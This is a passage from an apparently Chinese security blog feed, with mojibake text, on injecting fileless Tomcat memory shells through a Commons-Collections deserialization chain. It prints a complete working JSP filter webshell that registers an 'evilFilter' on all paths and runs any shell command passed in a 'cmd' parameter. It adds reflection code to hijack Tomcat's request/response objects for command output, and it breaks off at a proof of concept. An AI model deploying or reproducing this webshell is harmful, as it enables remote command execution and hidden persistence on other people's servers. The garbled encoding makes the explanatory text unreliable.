href="http://wjlshare.com/archives/1748">http://wjlshare.com/archives/1748</a></p><p><a href="https://xz.aliyun.com/t/11331">https://xz.aliyun.com/t/11331</a></p><p><a href="https://forum.butian.net/share/1410">https://forum.butian.net/share/1410</a></p><p><a href="https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg">https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> SPELè¡¨è¾¾å¼æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»“åˆCC11è¿›è¡ŒTomcatå†…å­˜é©¬æ³¨å…¥</title>
      <link href="/2023/03/12/jie-he-cc11-jin-xing-tomcat-nei-cun-ma-zhu-ru/"/>
      <url>/2023/03/12/jie-he-cc11-jin-xing-tomcat-nei-cun-ma-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»“åˆCCé“¾æ³¨å…¥çœŸæ— æ–‡ä»¶Tomcatå†…å­˜é©¬"><a href="#ç»“åˆCCé“¾æ³¨å…¥çœŸæ— æ–‡ä»¶Tomcatå†…å­˜é©¬" class="headerlink" title="ç»“åˆCCé“¾æ³¨å…¥çœŸæ— æ–‡ä»¶Tomcatå†…å­˜é©¬"></a>ç»“åˆCCé“¾æ³¨å…¥çœŸæ— æ–‡ä»¶Tomcatå†…å­˜é©¬</h1><p>Tomcatå†…å­˜é©¬åŸºç¡€å¯ä»¥çœ‹æˆ‘çš„ä¸Šä¸€ç¯‡ï¼š<a href="https://www.0kai0.cn/?p=240">https://www.0kai0.cn/?p=240</a></p><h2 id="å‰è¨€-fliterç­‰å†…å­˜é©¬å±€é™"><a href="#å‰è¨€-fliterç­‰å†…å­˜é©¬å±€é™" class="headerlink" title="å‰è¨€-fliterç­‰å†…å­˜é©¬å±€é™"></a>å‰è¨€-fliterç­‰å†…å­˜é©¬å±€é™</h2><p>å…·ä½“æ–°å»ºservletçš„è¿‡ç¨‹ï¼š<a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a></p><p>æ–°å»ºä¸€ä¸ªservlet:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®tomcatï¼šåº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡è¡¨ç¤ºhttpè®¿é—®servletçš„åœ°å€ï¼Œè¿™é‡Œå°±æ˜¯localhost:8080&#x2F;servlet</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è‡ªå®šä¹‰çš„filter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter åˆå§‹åŒ–åˆ›å»º&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ‰§è¡Œè¿‡æ»¤æ“ä½œ&quot;</span>);</span><br><span class="line">      </span><br><span class="line">       filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹web.xmlï¼ŒæŒ‡å®šurl-patternä¸º<code>/demo</code>ï¼Œä¹Ÿå°±æ˜¯è®¿é—®<a href="http://localhost:8080/servlet/demo%E6%97%B6%E8%A7%A6%E5%8F%91filter%EF%BC%8C%E4%B8%80%E7%9B%B4%E5%88%B7%E6%96%B0%E4%B8%80%E7%9B%B4%E8%A7%A6%E5%8F%91">http://localhost:8080/servlet/demoæ—¶è§¦å‘filterï¼Œä¸€ç›´åˆ·æ–°ä¸€ç›´è§¦å‘</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.filterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¹‹å‰åœ¨é¡¹ç›®ç»“æ„-&gt;æ¨¡å—-&gt;ä¾èµ–é‡Œå¯¼å…¥tomcat&#x2F;libçš„åŒ…</p><p>Filterå†…å­˜é©¬ä»£ç ï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filterTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContextFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">          isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        response.getWriter().write(output);</span><br><span class="line">        response.getWriter().flush();</span><br><span class="line">      &#125;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">  filterDef.setFilter(filter);</span><br><span class="line">  filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">  filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">  standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">  <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">  constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">  filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">  filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">  <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">  filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">  filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">  filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">  standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">  out.println(<span class="string">&quot;Inject done&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆè®¿é—®ä¸€éjspæ–‡ä»¶ï¼Œå°±èƒ½åœ¨patternä»»æ„è·¯å¾„å¸¦ä¸Šå‚æ•°RCE</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯æ— è®ºæ˜¯æ¨¡æ‹ŸåŠ¨æ€æ³¨å†Œçš„filterå†…å­˜é©¬ï¼Œè¿˜æ˜¯Listenerã€Servletã€valveå†…å­˜é©¬ï¼Œéƒ½ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„å†…å­˜é©¬ï¼Œå®ƒä»¬ä¼šè¾“å‡ºåœ¨tomcatçš„ç›®å½•ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¯”å¦‚ä¸Šè¿°è¿è¡Œçš„jspï¼Œåœ¨CTALINA_BASEç¯å¢ƒçš„<code>work\Catalina\localhost\Servlet_webç¯å¢ƒ\org\apache\jsp</code>éƒ½æœ‰ç›¸åº”çš„æ–‡ä»¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="Tomcatå›æ˜¾"><a href="#Tomcatå›æ˜¾" class="headerlink" title="Tomcatå›æ˜¾"></a>Tomcatå›æ˜¾</h2><p>â€‹è€Œä¸”æ ¹æ®ä¸åŒçš„å°è£…ï¼Œjspéƒ½å†…ç½®äº†ä¸åŒçš„è·å–requestå’Œresponseçš„æ–¹æ³•ã€‚æ¯”å¦‚filterå¯ä»¥ç”¨ServletRequestè·å–ï¼›Listenerç”¨ServletRequestEventè·å–ï¼›Servletç”¨HttpServletRequestè·å–ï¼›valveç®¡é“æ›´æ˜¯ç›´æ¥ä½¿ç”¨requestå’Œresponseå¯¹è±¡ã€‚æ‰€ä»¥ä¸ç”¨è€ƒè™‘å›æ˜¾é—®é¢˜ã€‚</p><p>â€‹ä½†æ˜¯ååºåˆ—åŒ–é€šç”¨çš„æ˜¯æ³¨å…¥å­—èŠ‚ç ï¼Œè¦è¿›è¡Œå›æ˜¾å°±éœ€è¦è·å–requestå’Œresponseå¯¹è±¡ã€‚</p><p>ApplicationFilterChainçš„lastServicedRequest å’Œ lastServicedResponse éƒ½æ˜¯é™æ€å˜é‡ã€‚å¦‚æœä¸æ˜¯é™æ€å˜é‡ï¼Œè¿˜éœ€è¦è·å–åˆ°å¯¹åº”çš„å¯¹è±¡ï¼Œæ‰èƒ½è·å–åˆ°å˜é‡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101113153631.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101113153631.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨ApplicationFilterChainçš„staticéƒ¨åˆ†ï¼Œstaticéƒ¨åˆ†éƒ½æ˜¯ä¼˜å…ˆæ‰§è¡Œã€‚ApplicationDispatcher.WRAP_SAME_OBJECTé»˜è®¤Falseï¼Œæ‰€ä»¥lastServicedRequest&#x2F;lastServicedResponseåˆå§‹åŒ–ä¸ºnull</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130436655.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130436655.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨104è¡Œï¼Œè¿™é‡Œçš„ApplicationDispatcher.WRAP_SAME_OBJECTä¸ºtrueçš„è¯ï¼Œå°±å‘ThreadLocalè£…å…¥requestå’Œresponse</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥åå°„ä¿®æ”¹ApplicationDispatcher.WRAP_SAME_OBJECTï¼Œå¹¶ä¸”åˆå§‹åŒ–ThreadLocalï¼Œå°±èƒ½è¿›å…¥ifåˆ¤æ–­ä»è€Œä»è¿™ä¸¤ä¸ªThreadLocalè·å–request&#x2F;response</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">applicationDispatcher</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> applicationDispatcher.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);<span class="comment">//ç”±äºprivateï¼Œè®¾ç½®ä¸ºå¯ä¿®æ”¹</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.reflect.Field&quot;</span>).getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">                f0.setAccessible(<span class="literal">true</span>);<span class="comment">//è·å–modifiersè¿›è¡Œå»é™¤finalä¿®é¥°ç¬¦</span></span><br><span class="line">                f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½¿ç”¨äº†finalä¿®é¥°ï¼Œè€Œæ²¡æœ‰ä½¿ç”¨staticä¿®é¥°ï¼Œå¯ä»¥è°ƒç”¨setAccessible(true)è·å¾—ä¿®æ”¹æƒé™ï¼Œæˆ–è€…ä¿®æ”¹Modifierï¼Œå»é™¤finalä¿®é¥°ç¬¦ï¼›<br>å¦‚æœåŒæ—¶ä½¿ç”¨äº†staticå’Œfinalï¼Œåˆ™åªèƒ½é€šè¿‡ä¿®æ”¹Modifierå»é™¤finalä¿®é¥°ç¬¦æ¥è·å–ä¿®æ”¹æƒé™ï¼›</p></blockquote><p>å»é™¤finalä¿®é¥°ç¬¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WRAP_SAME_OBJECT_FIELD.getModifiers()&amp; ~Modifier.FINAL</span><br></pre></td></tr></table></figure><p>lastServicedRequest&#x2F;lastServicedResponseä¹Ÿéœ€è¦å»é™¤finalæ‰èƒ½è¿›è¡Œä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">applicationFilterChain</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line">            f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()&amp; ~Modifier.FINAL);</span><br></pre></td></tr></table></figure><ul><li>å°†WRAP_SAME_OBJECT_FIELDè®¾ç½®ä¸ºtrueï¼Œå¹¶ä¼ å…¥åˆå§‹ThreadLocalè¿›è¡Œåˆå§‹åŒ–</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,<span class="literal">true</span>);</span><br><span class="line">lastServicedRequestField.set(applicationFilterChain,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">lastServicedResponseField.set(applicationFilterChain,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 